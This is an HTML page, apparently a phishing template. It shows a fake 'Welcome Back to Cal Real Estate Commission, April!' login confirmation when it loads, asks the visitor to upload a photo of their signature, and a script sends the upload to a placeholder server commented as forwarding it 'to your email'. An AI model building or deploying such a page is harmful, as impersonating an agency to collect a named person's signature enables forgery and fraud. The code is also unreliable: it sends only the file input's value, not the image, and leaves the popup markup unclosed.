<!DOCTYPE html>
<html>
<head>
  <title>Signature Upload</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background-color: #f1f1f1;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
      padding: 20px;
      border-radius: 5px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    }

    h1 {
      color: #333;
      font-size: 24px;
      margin-bottom: 20px;
    }

    p {
      color: #666;
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 10px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-weight: bold;
    }

    input[type="file"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .button-container {
      text-align: right;
    }

    .submit-button {
      background-color: #007bff;
      color: #fff;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .submit-button:hover {
      background-color: #0056b3;
    }

    .popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
    }

    .popup-content {
      background-color: #fff;
      padding: 20px;
      border-radius: 5px;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
    }

    .popup-content h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    .popup-content p {
      font-size: 16px;
      }
  </style>
  <script>
    // Function to display the popup message
    function showPopupMessage() {
      var popup = document.getElementById("popup");
      popup.style.display = "block";
      setTimeout(function() {
        popup.style.display = "none";
      }, 3000); // Adjust the delay (in milliseconds) before the popup disappears
    }
    // Function to close the popup
    function closePopup() {
      var popup = document.getElementById("popup");
      popup.style.display = "none";
      popup.style.opacity = 1;
    }
    // Function to forward the signature data to your email
    function forwardSignature() {
      // Retrieve the signature image data
      var signatureImage = document.getElementById("signature").value;
      // Send the signature image data to your server-side script or service
      // Replace 'YOUR_SERVER_SCRIPT_URL' with the actual URL of your server-side script or service
      // Example using AJAX:
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'YOUR_SERVER_SCRIPT_URL', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
          console.log("Signature forwarded successfully!");
        } else {
          console.error("Error forwarding signature.");
        }
      };
      xhr.send('signature=' + encodeURIComponent(signatureImage));
    }
  </script>
</head>
<body onload="showPopupMessage()">
  <div class="container">
    <h1>Signature Upload</h1>
    <p>Please upload your signature below. You can draw it yourself or upload a photo.</p>
    <form>
      <div class="form-group">
        <label for="signature">Signature:</label>
        <input type="file" id="signature" name="signature" accept="image/*" capture="user">
      </div>
      <div class="button-container">
        <button type="button" class="submit-button" onclick="forwardSignature()">Submit</button>
      </div>
    </form>
  </div>
<!-- Popup message -->
  <div id="popup" class="popup">
    <div class="popup-content">
      <h2>Welcome Back to Cal Real Estate Commission, April!</h2>
      <p>You have successfully logged back in.</p> <button onclick="closePopup()">Exit</button>
    </div>
</body>
</html>
